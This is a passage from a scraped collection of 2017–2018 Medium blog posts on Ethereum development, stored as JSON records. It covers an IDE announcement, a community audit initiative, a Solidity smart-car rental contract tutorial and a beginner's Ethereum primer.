mind, as Connie Yang shows in her blogpost Why design is the killer app for crypto. While it\u2019s certainly possible (and necessary!) to slap better design on a technically complex system, it will be challenging.\u201cYou\u2019ve got to start with the customer experience, and work backwards to the technology.\u201dCurrent IssuesIt is encouraging to see people like Varun and Connie working on user-experience. And they\u2019re not alone, design firms like IDEO are also working on improving user experience.I believe we need more than great designers. I believe we also need developers who have experience building apps with great user-experience, like iOS and MacOS developers for example. As Microsoft Steve Ballmer famously said: \u201cDevelopers\u201d.\u201cDevelopers\u201d (20x)I am a crypto developer. I\u2019ve written smart contracts in Ethereum\u2019s Solidity language and I\u2019ve created tools to make it easier to use crypto in mobile applications. The Ethereum developer toolchain has improved substantially the last year. But especially for occasional Ethereum developers, it still lacks the polish and ease-of-use of for instance the Apple or Microsoft developer toolchain.Several other crypto developers told me they use several tools to write smart contracts. Atom for coding, Remix, a web-based tool that only works if you\u2019re online, for debugging and deploying. It works, but it\u2019s not the best experience.The Turbo Pascal EffectMS-DOS programming in the early 1980s was not unlike blockchain development in 2018: Developers used separate tools, dedicated to specific tasks: an editor, a command line compiler, a command line debugger, and a command line linker.That all changed with the introduction of Borland Turbo Pascal in 1984. The innovation was to package all the separate tools into a single Integrated Development Environment (IDE). For the first time, the whole development workflow could be covered with one single application. Turbo Pascal simplified the edit-compile-run-debug loop. (The low price of $49, and the unusually good documentation also helped)Borland sold 400,000 copies in the first 2.5 years. Especially impressive considering that the total addressable market was estimated at just 30,000. Borland created a market nobody knew existed.One unexpected side effect of the Turbo Pascal success was that the number of MS-DOS applications skyrocketed, thereby contributing to MS-DOS becoming the dominant platform.Composite: Turbo Pascal for BlockchainCrypto desperately needs its Turbo Pascal moment: a tool so powerful and easy to use, both quantity and quality of dApps will skyrocket. That way, both higher utility and better user-experience will be tackled.I have been working on an open source editor that could become the Turbo Pascal for Blockchain, called Composite. It\u2019s the easiest developer tool on the market. Since it is developed natively in Swift/Cocoa, it\u2019s also the fastest developer tool out there. It\u2019s lightning fast.1. Installing the toolchain and keeping it up-to-date is finally a breeze.2. Creating a new project is as easy as choosing a templates. You\u2019ll be able to create your own templates in future versions.3. Name your new project.4. Editing, debugging, and deploying all from one single easy-to-use application.What about blockchains that aren\u2019t Ethereum?The current pre-alpha version of Composite is Ethereum only, but Composite is designed to support more blockchains. I\u2019d love to add support for more blockchains and make it dApp development easy for every blockchain.If you are a smart contract developer and would love to use Composite on another blockchain than Ethereum, leave a comment.What is a blockchain worth without adoption or utility?A blockchain without users or usage isn\u2019t worth much. Composite makes it easy for blockchains to attract high-quality developers and have them developed useful and easy-to-use dApps. If you are developing a blockchain and would like to see support for your blockchain in Composite, email me.What\u2019s next?If you want to keep up-to-date on Composite development, join the Composite Telegram group: https://t.me/joinchat/F84Ewkd5t-RLL26-Wj7tPAIf you like to test the pre-alpha version of Composite, or are interested in adding support for your blockchain to Composite, email me.If you work at a crypto company and are interested in having Composite support your blockchain, email me.Composite is self-funded. If you want to support Composite, consider donating Bitcoin: 3BADHnwyuK54ZVa1dRtRj6Jj8H2BJz63Rc or Ethereum 0x7e77Bf36DAE7202927Fbf91A5f9e2E4e1837f077. Thank you in advance.BitcoinEthereum", "responses": 0, "tags": ["Ethereum", "Solidity", "Truffle", "Openzeppelin", "Smart Contracts"]}, {"title": "ZK Labs Community Audits Initiative for non-ICO Projects", "post_link": "https://blog.zklabs.io/zk-labs-community-audits-initiative-for-non-ico-projects-ea7830d082f8?source=search_post", "author_name": "Matthew Di Ferrante", "author_link": "https://blog.zklabs.io/@matthewdif", "publish_date": "2018-09-26", "last_modified_date": "2018-09-26", "readtime": "2.55", "claps": 390, "voters": 20, "content": "ZK Labs Community Audits Initiative for non-ICO ProjectsMatthew Di FerranteFollowSep 26, 2018 \u00b7 3 min readAs part of a broader pursuit to securing the ecosystem, we at ZK Labs are excited to announce our Community Audits initiative to sponsor audits for projects that have not done ICO and don\u2019t plan to do one.Examples of eligible projects include tooling and libraries important to the development ecosystem (e.g., web3js, solc), non-profit smart contract infrastructure (e.g. ENS, Multisig wallets), open source crypto code/libraries (e.g., ZoKrates), or services beneficial to community.Note that the project doesn\u2019t necessarily need to be non-profit to qualify, as long as it can serve as a utility to the community \u2014 for example, gambling contracts will never be eligible, but a state channel platform that has some fee system built in could be fine. The point of the community audits initiative is for grassroots projects to be able to receive quality audits without needing to think about raising large amounts of funding before the project can go live, and without having to go through a complex ECF-type application process for a grant.First Wave of Community AuditsAs part of this announcement, we\u2018re thrilled to publish the first two community audits we\u2019ve undertaken:SolidStamp: SolidStamp connects smart contract users and auditors to ensure the safety of their funds. The contract maintains an on-chain database of smart contract audits so you can be confident in the code you interact with on-chain.\u2014 The audit by Matthew Di Ferrante can be found here: https://zklabs.io/audits/solidstamp.htmlToken Subscription: The Token Subscription project enables applications to create a trustless subscription model without their users needing to constantly and manually transfer tokens.\u2014 The audit by Dean Eigenmann can be found here: https://zklabs.io/audits/tokensub.htmlAbout the InitiativeSo far, the following auditors are confirmed as being part of the initiative:Matthew Di Ferrante, ZK Labs Founder & Ethereum Security ContributorDean Eigenmann, ZK Labs Auditor & ENS DeveloperNick Johnson, ENS Project Lead & Ethereum Core DevI personally will commit to doing at least one reasonably sized community audit per month, along with Dean Eigenmann. We hope to grow the pool with more volunteers as time goes on.For any audits that would take a much longer amount of time, we will also be maintaining a charity multisig whose purpose is to fund more complex undertakings. A percentage of profits from ZK Labs will go to fund the initiative, and donations to it are welcomed by anyone. When donating you can also nominate a project or specify a project class (e.g, crypto code, tooling, etc) that you would like your audit donation to go towards.If you have a project you want audited that you feel meets the eligibility criteria, want to be involved or are willing to be a multisig curator, reach out to us at audits@zklabs.io or come talk to us in our public room on riot: https://riot.im/app/#/room/#zklabs:matrix.orgI hate paperwork just as much as the next cryptoanarchist, so I promise the process will be simple and decisions quick \u2014 don\u2019t be afraid to email, even if we may not be able to do a full audit I\u2019m always happy to provide advice.", "responses": 0, "tags": ["Ethereum", "Security", "Solidity", "Smart Contracts"]}, {"title": "A Smart Contract for a Smart Car", "post_link": "https://medium.com/hackernoon/a-smart-contract-for-a-smart-car-db08eda4bb4f?source=search_post", "author_name": "Pablo Ruiz", "author_link": "https://medium.com/@pabloruiz55", "publish_date": "2017-11-01", "last_modified_date": "2019-05-13", "readtime": "15.0", "claps": 118, "voters": 19, "content": "Photo by Evgeny Tchebotarev on UnsplashA Smart Contract for a Smart CarPablo RuizFollowNov 1, 2017 \u00b7 16 min readLast year while I was attending a fintech conference I listened Brett King talking about how the cars of the future would be able not only to drive by themselves, but also, thanks to Blockchain technology they would be able to work for their owners. Since I heard that there have been a few developments in this area, but we are yet very far from being able to own a piece of a car that will drive for Uber instead of accumulating dust in a parking lot and making money for me while I\u2019m at the office.That talk stuck with me, but as much as I\u2019d like to build such a car, I don\u2019t even know how a regular car works. Fortunately for me, I do know a bit about software development and smart contracts, so in this article I\u2019d like to give some thought about how I\u2019d build such a contract for a driverless car.For this article I\u2019ll layout the basics of an autonomous car whose ownership is shared by several people. The car will be available for any 3rd party to rent it for the day and then, once the rental period is over it will distribute its earnings to the owners. (Minus eth gas stipends and other expenses).Some assumptions and considerations about this smart car and its contractFor this analysis I will be making some assumptions that will simplify the logic of the smart contract.First, I\u2019ll be assuming that the car, somehow, is running a full node that allows it to sign transactions. The car would own an account/address which will be the \u201cowner\u201d of the smart contract that interacts with the different actors.Second, I won\u2019t be dealing with a lot of real-world issues such as the person renting the car stealing it, or being involved in an accident that renders the car unusable.Third, ownership of the car will be very simple. First of all, owners get a piece of the car from the get go, assuming the payment was made off-chain in the dealership. Then, each owner has an equal share of the car. Finally, we won\u2019t be dealing with complex decisions as this article would get very extensive.Finally, I\u2019m also assuming that the car, somehow, provides the user with some interface that is able to interact with the smart contract. Furthermore, the car can schedule certain functions to be called later in time, such as calling the function in the smart contract that ends the rental period after 24 hours. Also, I\u2019m assuming that the users posses a device capable of interacting with the blockchain such as a web3 enabled browser.The purpose of these assumptions is making the smart contract as simple as possible while leaving as many decisions as possible to the car itself. I\u2019m quite certain that what follows is possible in a real-world scenario, but may not be the optimal solution. By all means, feel free to discuss better approaches or point out parts of the contract that you think would not work at all in the real world.The Smart ContractThe complete code for the smart car contract (v0.1) can be found in the following Github repo: https://github.com/pabloruiz55/SmartCar/blob/master/contracts/SmartCar.solWhat follows is not the complete code, but a highlight of the most important parts of it.Initializing the car smart contract//The address of the car, which will sign transactions made by this contract.address public carSigner;// Value of the car, in weiuint public carValue;bytes32 public licensePlate;// Owners of the car, they will be the ones that receive payments from the car.// We assume each owner owns the car equally.address[] public owners;uint constant MAX_OWNERS = 100;//Earning from driving will be distributed to each owner for them to withdrawmapping (address => uint) public ownersBalance;uint public balanceToDistribute;uint constant INITIAL_CAR_SHARES = 100;mapping (address => uint) public carShares;DriverEntity currentDriverEntity;DriveStatus currentDriveStatus;//To keep track of who's currently using the car//If the owners are driving it, it will be their address.//If someone rented it, it will be the renter address, so he can be held accountable.//In this case, we could even ask for a warranty which will be sent back if the car is ok.address currentDriverAddress;uint currentDriveStartTime = 0;uint currentDriveRequiredEndTime = 0;//Ratesuint constant RATE_DAILYRENTAL = 1 ether; //1 ETHenum DriverEntity {    None,    Owner,    Autopilot,    Cab,    Uber,    DailyRental,    Other  }enum DriveStatus {    Idle,    Driving,    TurnedOff,    Unavailable  }// Somehow, the car should be able to communicate its \"internals\" to the contract.// These internals are the ones relevant to the functioning of the contract, such as it's fuel.// We don't care about oil or coolant for example, at this point at least.struct CarInternals {    uint fuel; //Measured in percentage  }CarInternals carInternals;bool carIsReady = false;modifier onlyIfReady {        require(carIsReady);        _;    }function SmartCar(bytes32 _licensePlate, uint _carValue){    require(_licensePlate.length >0 && _carValue > 0);    carSigner = msg.sender;    carValue = _carValue;    licensePlate = _licensePlate;    carShares[address(this)] = INITIAL_CAR_SHARES;    currentDriveStatus = DriveStatus.Idle;    currentDriverEntity = DriverEntity.None;    carInternals.fuel = 100;  }Let me explain each state variable and the constructor for the SmarCar contract:carSigner: This is the account that represents the car. As I mentioned before, the car is supposed to be running its own node which will sign the transactions that it needs to execute. This is the account that will deploy the contract for the car. In a real life scenario, I imagine the manufacturer setting up the car node and account. We would assume that neither the dealership nor the manufacturer has access to the private keys of this account. What I\u2019m trying to say is: The car will need to execute contract functions and the only way for it to do it would be if the car itself is an Externally Owned Account that can communicate with the smart contract without depending on human interaction.carValue / LicensePlate: This are values that should be provided when the car contract is deployed. LicensePlate could be used to identify the car (We are not making any checks to make sure it is unique, though) and carValue sets the price the owners paid for it. We are not using carValue, but we could have a function that allows an owner to sell his share of the car to someone else, and carValue/owners could be used for establishing a base price.owners / MAX_OWNERS = 100: Owners is an array that holds the address of all the owners of the car. MAX_OWNERS is a constant that will put a cap on how many owners the car can have.ownersBalance / balanceToDistribute: ownersBalance will be used to store the pending balance each owner has available for withdrawal. When the car starts a paid ride it will store the ether received in its own balance, then when the ride ends it will be distributed to each owner in equal parts for the owner to manually withdraw his balance.carShares / INITIAL_CAR_SHARES = 100: carShares is used to store how much of the car each owner has. For the time being, we made it so that each owner owns equal parts of the car, but it could be done so someone could own 50% of the car and other 10 people 5% each. That would also have to affect how earnings are distributed so it is done pro-rata.currentDriverEntity / currentDriveStatus: These variables are part of a state machine that will control what the car is currently doing. For instance, if its being driven, the contract shouldn\u2019t allow for someone else to rent it. We are also using DriverEntity to keep track of what the car is currently doing \u2014 Is it working for Uber? Has it been rented for the day? Is one of the owners using it? This also raises a few more questions about how autonomous the car should be and how to determine what it should be doing, which I\u2019ll discuss at the end of the article, but that is also way out of the scope of this article.currentDriverAddress / currentDriveStartTime / currentDriveRequiredEndTime: These variables keep track of who has currently rented the car, when the rental period started and when it is supposed to end (24 hours after the rental period started). currentDriveRequiredEndTime is used to determine if the person that rented the car returned it within the specified rental period. For the time being we are just logging this, but some action could be taken if the conditions are not met.CarInternals: We are not doing anything with this yet, but this could be used to keep track of the internals of the car. Does it need fuel? What\u2019s the battery status? Does it need an oil change? Coolant? If any of these internals are in critical levels, what should it do?SmartCar constructor: The constructor of this contract is pretty straightforward. We are just setting the initial state of a few of these variables and most importantly assigning the carSigner.Assigning the owners//We will assume, for the time being, that the owners are set by the carSigner automatically,//and that they can't be changed.//We are basically doing the purchase of the car, off-chain.//We also assume that each person payed the same amount for the car, thus owning equal shares.function setOwners(address[] _owners) public {  require(msg.sender == carSigner);  require(_owners.length > 0 && _owners.length <= MAX_OWNERS);  //Can only set owners once.  require(owners.length == 0);  owners = _owners;  //We take the total carShares the \"car\" owns and we distribute them equally among new owners  //If the shares are not properly divisible (I.E: 100 shares / 3 owners) the remaining shares stay with the car    uint sharesToDistribute = carShares[address(this)]/owners.length;  for (uint8 i; i<owners.length;i++){      carShares[owners[i]] = sharesToDistribute;      carShares[address(this)] -= sharesToDistribute;    }  carIsReady = true;}The setOwners function receives an array of addresses making them the owners of the car. After this function is called, the car will have one or more owners which will share the carShares in equal parts. This function is meant to be called by the carSigner, which I don\u2019t yet know if optimal, but we are assuming this is set up at the dealership. So, as you must have figured out by now, there\u2019s a huge part of the system that still requires a lot of human interaction and coordination. In this case, the dealership would be responsible for having these owners pay their part of the deal and then, somehow, have the car register its brand new owners. I imagine the guy at the dealership using his password to unlock some kind of interface in the car that will prompt it to execute this function on the smart contract.Renting the car for the day// Anyone can rent the car for the day, as long as it is idle.// In real life, the workflow could be as follows:// 1. User calls this function from his mobile device or browser web3 dapp, sending the correct amount of eth// 2. The system generates a PIN number (we are just using his address as PIN right now)// 3. User gets on the car and unlocks it using the pin.// As it stands, we assume that the car, somehow recognizes that the user// that paid is actually in the car. We added a activateCar function that// acts as if it was a PIN.function rentCarDaily() public onlyIfReady payable{  //No one must be using the car  require (currentDriveStatus == DriveStatus.Idle);  require (msg.value == RATE_DAILYRENTAL);  currentDriverAddress = msg.sender;  currentDriveStatus = DriveStatus.Driving;  currentDriverEntity = DriverEntity.DailyRental;  currentDriveStartTime = now;  currentDriveRequiredEndTime = now + 1 days;  balanceToDistribute += msg.value; // ADD SafeMath Library  E_RentCarDaily(currentDriverAddress,msg.value,   currentDriveStartTime,currentDriveRequiredEndTime);}Once the car has been acquired it is ready to be used. Right now we are only implementing one rental option: anyone can rent it by the day, by paying 1 eth (yes, since its a very novel and amazing car its price is outrageous).What this function basically does is to set its new state (being driven as a rental for the day) and registering who rented it, at what time and when he should be returning it. Also, we are adding the ether received to the contract\u2019s internal balance so it knows how much money should be later distributed to the owners.Once again, there\u2019s a lot of assumptions going on here. I\u2019m imagining the person renting the car used his web3 enabled browser to access a dapp to execute this function. But how does the car know that the person starting the car is this person. Well, we could have this function generate a receipt with a PIN number and have the car prompt for the PIN when someone tries to start it. Another solution could be to have the car prompt for payment when someone tries to drive it, but this would require a high level of trust as the driver would have to use his private key to sign the transaction in a rather public device. It would be a very risky proposition\u2026 I wouldn\u2019t try to access my home banking from a pc in a public library, why would I unlock my Ethereum account in a \u201cpublic\u201d car?// For the car to start it will ask the user for his PIN. Instead of generating a PIN  // we are using his address as PIN, making sure they match.  // This would be done in the car interface, of course it's a terrible user experience to as for an  // address instead of a 4 digit PIN, but it will do for now.  // We are not using this internally.function activateCar(address _user) public view onlyIfReady returns(bool){    require (_user == currentDriverAddress);    return true;  }Here\u2019s a very simplistic solution. Assume the car prompts the user to enter his address each time he tries to start the car. It would check if the address entered is the same that rented the car. Simple but suboptimal. For one, anyone could scan the latest transactions to know who rented it and use his address to \u201csteal\u201d the rental from them \u2014 though this could be mitigated by hashing the address. Second, it\u2019s a terrible user experience! Imagine having to enter 42 characters in the car touchscreen just to start the car each time.Returning the car and distributing earnings// This should be called by the end of the rental period.// Driver would tell the car to end the rental and the car would execute this function.// Also, the car can call it if the rental period ended. (This would be scheduled car-side)// Here, we distribute earnings and do the necessary cleanup such as// issuing fuel recharge if needed.function endRentCarDaily () public onlyIfReady {  // The person renting the car can end the rental anytime.  // The carSigner can end the rental only after the renting period has ended  // in order to \"claim the car back\".  require ((msg.sender == carSigner && now > currentDriveRequiredEndTime)            || msg.sender == currentDriverAddress);  //To be called only if it is being rented for the day.  require (currentDriveStatus == DriveStatus.Driving);  require (currentDriverEntity == DriverEntity.DailyRental);  bool endedWithinPeriod = now <= currentDriveRequiredEndTime;  E_EndRentCarDaily(currentDriverAddress, now, endedWithinPeriod);  currentDriverAddress = address(0);  currentDriveStatus = DriveStatus.Idle;  currentDriverEntity = DriverEntity.None;  currentDriveStartTime = 0;  currentDriveRequiredEndTime = 0;  //Distribute earnings of the car rental  distributeEarnings();}Once the customer is done with the car he can return it by calling this function. This will basically end the rental period, make the car available again for others to rent it and distribute the earnings to the owners. The car itself can end the rental period if 24 hours have passed and the driver has not done it. For this to be possible, that car would have to schedule this function call internally as there is no way as of today for a contract function to be scheduled.Notice we are not doing anything to punish the driver for not returning the car in time, but something could be done like asking for a warranty payment beforehand and holding that in escrow until the car is returned. If they returned the car after the 24 hours rental period ended they could be charged extra.Also, we are not taking into account the fuel level the car had when it was rented. Should the driver return the car as it was when it was rented? Should he be charged more for the fuel difference? \u2014 Or even refund money if gas was at 50% and they return it at 75%?//Distribute earnings to ownersfunction distributeEarnings() internal onlyIfReady {  //If the carSigner is running out of eth for transactions, transfer before distribution  transferEthForStipends();  //ETH should also be reserved for recharging fuel at a station.   Not considered yet.  //refuelCar();  uint earningsPerOwner = balanceToDistribute / owners.length;  for (uint8 i=0;i<owners.length;i++){   ownersBalance[owners[i]] += earningsPerOwner; // ADD SafeMath Library   balanceToDistribute -= earningsPerOwner; // ADD SafeMath Library  }}Once the car has been returned it will calculate and distribute the money to each one of the car shareholders. Before the money is distributed, it has to keep some money to pay for its own expenses, though.For the time being we are just considering the gas stipends the carSigner has to pay for for calling each and every function throughout the day. Each transaction the car does costs some gas and the carSigned is the one that pays for them in most cases, so it should have an allocation of ether for the car to be able to function properly.Here we could also calculate the fuel that was consumed and other expenses the car had to pay during this trip. \u2014 Tolls, public parking, etc. \u2014 and keep that money before distributing its balance to the owners.// carSigner will need eth to pay for gas stipends being used throughout the day.// It should be able to get it from the car contract balance.// This would be called by the car automatically each day, for example.function triggerTransferEthForStipends() public onlyIfReady{  require(msg.sender == carSigner);  transferEthForStipends();}function transferEthForStipends() internal onlyIfReady {  uint amount = 1 * (10 ** 17);  // 0.1 eth per day should be enough  require (carSigner.balance < amount);  require(balanceToDistribute >= amount);  balanceToDistribute -= amount; // ADD SafeMath Library  carSigner.transfer(amount);  E_TransferEthForStipends(carSigner,amount, now);}This function makes sure carSigner (the car) has enough eth for calling the car contract functions throughout the day. This gets called after every ride, just in case, but can also be triggered by the car if it detected it doesn\u2019t have enough money to function properly.Withdrawal of funds//Each owner should call this function to withdraw the balance they have pending.function withdrawEarnings() public onlyIfReady{  //Make sure the one calling the function is actually an owner  bool isOwner = false;    for (uint8 i=0;i<owners.length;i++){      if (owners[i] == msg.sender){        isOwner = true;        break;      }    }  require (isOwner);  uint balanceToWithdraw = ownersBalance[msg.sender];  require (balanceToWithdraw > 0);  ownersBalance[msg.sender] =0;  msg.sender.transfer(balanceToWithdraw);}Finally, at any time, each owner can execute this function to withdraw whatever pending balance they are owed.Where to go from here?There are so many improvements that could be made to this contract that it\u2019s hard to figure out where to start. I\u2019ve raised a few concerns and pointed several places in the code where there could be room for improvement, for instance:Is there a better way to build this rather than having the car execute transactions? How can the car node be set up safely. Should the manufacturer do this? The dealership?We are not using carValue. Should we allow owners to sell their share of the car? Should we use carValue or the owner can set his asking price? Should anyone be able to sell his share of the car at any moment? Should there be a voting process? Can anyone buy it?We are not contemplating a case where someone could buy a bigger share of the car. Right now everyone has the same ownership percentage, and we are assuming the all paid the same amount of money at the dealership. \u2014 Well, we are also assuming a dealership is prepared to have multiple people buy a share of a car in Fiat currency and somehow that translates to this on-chain scenario seamlessly, :D \u2014 So, this could be done differently and not necessarily each owner should own the car in equal parts. This would also affect earnings distribution and expenses.Right now we assume the car is Idle and that anyone can come and rent it for the day (or an owner use it, or have it work for Uber, though these functions have not been implemented). But how should the car decide what it should do? Should it allow someone to rent it for the day without asking the owners if they will need it today? If several owners express their need to use the car, how will it be decided who has priority over it? If the car is meant only for rental, how does it decide when it\u2019s best to work for Uber or be rented for the day or work as a cab?When the car is returned, if it was not returned within the 24 hours period, we are not taking actions. What should happen if the rental period is over and the driver didn\u2019t return the car yet. Should the car, somehow, stop working? Should it prompt the driver to make a new payment? Should we have asked for a warranty before rental and kept the money on escrow? Should we blacklist the driver so they are not allowed to rent this car (or any other car in the network) ever?The car internals: The contract will need to know, at the very least, if the car need refueling. What would be the most efficient way for the car to communicate this? We are assuming the car has every kind of sensors that would allow it to get this data and in turn, forward this data to the smart contract.The way we assign the owners is suboptimal. First, we could have another entity, the car dealership for example, that upon receiving the money is authorized to call this function on the car smart contract to register the owners. Second, in this example, we are allowing owners to be set just once when the car is bought. How about letting a current owner buy another one out? What if we wanted someone else become owner of the car later on? Third, and this has to do in part with the fact that we are not allowing owners to own more shares of a car than others, if we have 3 owners they are getting 33% of the car each and the remaining 1% is held by the car itself, what should we do with that? Finally, so far it doesn\u2019t even matter how much of the car someone owns as it is not being used to calculate the distribution of earnings. One more thing, maybe we don\u2019t even have to distribute the money the car earns according to ownership.As you can see, this articles raises a lot of questions for which I don\u2019t have the answers yet, but I hope it starts a debate on how the Ethereum blockchain is supposed to interact with IOT projects and the other way around.Feel free to share any suggestions or critics in the comments section below!", "responses": 1, "tags": ["Ethereum", "Blockchain", "IoT", "Solidity", "Smart Contracts"]}, {"title": "Writing Software Contracts for Ethereum \u2014 Part 1", "post_link": "https://medium.com/@IndianGuru/writing-software-contracts-for-ethereum-part-1-a9c2eb1bd27?source=search_post", "author_name": "Satish Manohar Talim", "author_link": "https://medium.com/@IndianGuru", "publish_date": "2017-07-17", "last_modified_date": "2018-04-15", "readtime": "7.46", "claps": 95, "voters": 18, "content": "Writing Software Contracts for Ethereum \u2014 Part 1Satish Manohar TalimFollowJul 17, 2017 \u00b7 8 min read(Updated on 26th Jan. 2018)In Part 2 we understand some basics of Solidity language and write a simple software contract for Ethereum using Remix.In Part 3 we will setup our private blockchain using gethVenturing into the world of building smart contracts on Ethereum can be very daunting at first. Where do you start?Ethereum is really fast moving. This means a lot of the tutorials you will try and follow will not quite work.My search continues and I have plucked bits and pieces from all over the place and this is what I have come up with.First, the basics.The BasicsWho is Vitalik Buterin?Vitalik is the creator of Ethereum. He first discovered blockchain and cryptocurrency technologies through Bitcoin in 2011. He wrote the Ethereum white paper in November 2013. He now leads Ethereum\u2019s research team, working on future versions of the Ethereum protocol.What\u2019s a Blockchain?We have this idiom in the English language that goes something like this: \u201cset it in stone\u201d (we have a pretty high level of trust in stone). A blockchain is really just the above: a kind of material that, through a special mix of cryptography and decentralization, has the properties of permanence, transparency, and neutrality \u2014 whatever you put on it. Except now we can do it digitally.Ethereum is an open source blockchain platform with built in programming language that allows developers to write, test and execute their decentralized application (contract). Data stored on Ethereum blockchain can be viewed by anyone but one having the private key can access it, and is the owner. Any transaction performed is anonymous, parties involved are always unknown.At the most basic level a blockchain is a digital ledger of transactions, one that is accessible to the public and keeps track of transactions anonymously. It is an open-source software, which means that anyone can see what is happening and make changes to it. What is unique about it is that through cryptography, the recordings are secure and essentially unalterable. At the same time, any changes made to the ledger are distributed globally. Because essentially anyone can participate in and verify the transaction, it puts the power of verification in the hands of those who use it. Blockchain is virtually impossible to hack. This blockchain is not controlled by a central administrator, but instead each node in the network stores its own copy of the blockchain that is shared and visible to anyone within the network.Image Reference \u2014 https://bitsonblocks.net/In the image above, blocks in a chain refer to previous blocks, like page numbers in a bookEvery \u201cblock\u201d in this blockchain contains a record of recent transactions, a reference to the block that came immediately before it, and an answer to a difficult mathematical puzzle, among other things.A blockchain is collectively maintained by \u201cminers\u201d, who are members within the network that compete to validate Ether transactions in each block by solving the complex algorithmic problem associated with the block. They do this by buying or renting lots of computing power to run these complex algorithmic problems on. The incentive for them to use their computing power to verify transactions is that they are rewarded with Ether (shortened to ETH, is Ethereum\u2019s digital currency) if they solve the problem and validate a Ethereum block.Ethereum Blockchain App Platform\u2019s main page is \u2014 https://ethereum.org/Types of BlockchainsPublic blockchain like Bitcoin, Ethereum. Public blockchains by nature are open source.Consortium blockchain \u2014 example is R3 which is a distributed database technology company. It leads a consortium of more than 70 of the world\u2019s biggest financial institutions in research and development of blockchain database usage in the financial system. Just anybody can\u2019t get involved in the consensus process as one can do in a public blockchain.Private blockchain. A company\u2019s very private information may be kept on this type of blockchain. An example of this is MultiChain.Is Blockchain a revolutionary piece of technology?Yes.With the use of smart contracts (more on this later) on top of the blockchain along with no single point of failure it will be possible to transfer things of value such as property, vehicles etc. very securely (with the power of cryptography). As such this will allow us to transfer very securely things of extreme value. It also cuts out any middle man (Lawyers, Estate Agents etc.) in the above transactions. Also, deals or transactions get completed far quickly.What\u2019s Ethereum?Ethereum is software running on a network of computers that ensures that data and small computer programs called smart contracts are replicated and processed on all the computers on the network, without a central coordinator. The small computer programs being run are called smart contracts, and the contracts are run by participants on their machines using a sort of operating system called a \u201cEthereum Virtual Machine\u201d (EVM).In other words, Ethereum is an open software developer platform based on blockchain technology that makes it very easy for people to build and deploy decentralized applications (dapps).Ethereum applications will always, without fail, execute the code they say it will. The code can always be checked. One can personally check and ensure that it does what it says it does.There is no downtime. These applications are always going to be available.Ethereum applications are resistant to DDOS attacks.Previously building decentralized applications required a very good and complex knowledge of Cryptography or cryptology.Ethereum makes this technology available to all by simplifying it.Ethereum has a complete programming language, sometimes called EtherScript (though not so popularly used).How does the change a person makes with a transaction, gets verified by a majority and conformed into the blockchain?A user makes a transaction and broadcasts it to the network. The entire Ethereum network is a giant mass of nodes (computers) connected to one another.Nodes (computers) verify that the transaction is correctly signed and if so, pass it to their peers.A miner\u2019s node will take the transactions with a sufficient gas price (i.e, sufficient transaction fees) and process them to create the contents of the block.The miner tries random numbers until they find one that, hashed with the contents of a block, proves a sufficient amount of work.The miner broadcasts the block.Each node checks the validity of the entire block, from the header to verifying the result of every transaction, and if it checks out, it declares that block valid and passes it on. Otherwise, it ignores the block.Each node that handles the transaction personally checks to make sure it\u2019s valid. So even if it appears that every other node on the whole network insists that this or that transaction happened, a node can still decide that that transaction was invalid. \u201cConsensus\u201d means that everyone will hopefully reach the same answer eventually, not that nodes necessarily listen to the voice of the majority.Who is using Ethereum?Tech giant IBM is building a blockchain-based platform for seven big European banks, including HSBC and Deutsche Bank, that is aimed at simplifying trade finance transactions for small- and medium-sized companies.Other interested companies include Microsoft, JP Morgan Chase, Deloitte amongst many other large corporations.Then there is the Enterprise Ethereum Alliance that connects Fortune 500 enterprises, startups, academics, and technology vendors with Ethereum subject matter experts.Many dapps have already been built on Ethereum \u2014 https://dapps.ethercasts.com/Some of the areas, other than finance, where blockchain is being used are:Why become a Blockchain developer?There are five areas in which there is a growing need for blockchain developers:Startups in the Blockchain and Crytocurrency fieldCorporate Tech Firms like IBM, Microsoft etc.Banks especially global banksGovernment organizationsProfessional Services firms like KPMG, Deloitte, PricewaterhouseCoopers (PwC), Ernst & Young (EY) etc.It is expected that the would-be blockchain developer has an understanding of:You are able to code in different languages especially like Java and C++You are comfortable with Large data setsYou have a basic understanding of CrytographyYou have a basic understanding of the BlockchainWhat\u2019s Ether?Ether (shortened to ETH) is Ethereum\u2019s digital currency.Every single step in a smart contract is a transaction or a complex computation. Running and storing things on Ethereum would have a cost that is measured in \u201cgas\u201d. The price of this gas is paid by the requester in \u201cEther\u201d. Ether is the digital currency with which everything runs in the Ethereum (Ether\u2019s price as on 26th Jan. 2018 at 8.50 hrs (IST) was US$ 1,066.59 \u2014 https://etherscan.io/stat/supply ). The main reason why people fulfill their end of the bargain in a contract is that they are incentivized to collect Ether.Ether is the second most valuable Crypto currency after Bitcoin \u2014 http://coinmarketcap.com/ and http://coinmarketcap.com/currencies... Ethereum\u2019s technology which we briefly mentioned above is what making Ether\u2019s price shoot up as we go ahead.Ether has a lot in common with the famous digital currency Bitcoin. Both are a purely digital store of value and means of exchange that cannot be counterfeited. Both are implemented so that no one can manipulate the currency supply. Both can be transferred around the world, like email, and in a very final way, like cash. Both have value today because users expect them to have value tomorrow, and because they can do things traditional money can\u2019t.It is very important that we have these two things absolutely clear:Smart contracts are how things get done in Ethereum.Ether is the currency that is used in the Ethereum network to do anything.The primary difference between Ethereum and any other cryptocurrency is that it\u2019s not just a currency, it\u2019s an environment. Here anyone can take advantage of the blockchain technology to build their own projects and DAPPS (decentralized applications) through smart contracts.ETH UnitsJust like 1 dollar can be split into 100 cents, and 1 Bitcoin (BTC) can be split into 100,000,000 satoshi. Ethereum too has its own unit naming convention.The smallest unit is a wei and there are 1,000,000,000,000,000,000 of them per ETH. There are also some other intermediate names: Finney, Szabo, Shannon, Babbage, Ada \u2014 all named after people who made significant contributions to fields related to cryptocurrencies or networks.Wei and Ether are the two most common denominations.Image Reference \u2014 https://bitsonblocks.net/Where do I buy Ether?The following sites would help you in buying Ether:https://bittylicious.com/https://shapeshift.io/#/coinshttps://www.coinbase.com/?locale=enhttps://localbitcoins.comhttp://faucetdump.com/ethereumhttps://www.quora.com/Where-can-I-buy-Ethereum-in-IndiaResourcesVideos:What is BlockchainWhat is the Blockchain ?The Block Chain \u2014 The BasicsLinks:Everything you\u2019ve ever wanted to know about Ethereum, patiently explainedWhat is Blockchain Technology? A Step-by-Step Guide For BeginnersHow To Setup An Ethereum Wallet And Buy A Custom TokenCryptoCurrency Market CapitalizationsJobs via angel.co | blocktribe.com |In Part 2 we will understand Solidity and write a simple software contract for Ethereum using Remix.In Part 3 we will setup our private blockchain using geth.", "responses": 0, "tags": ["Blockchain", "Solidity", "Ethereum", "Smart Contracts", "Ether"]}, {"title": "Latest Updates: New Language Announcements and Updated Beta 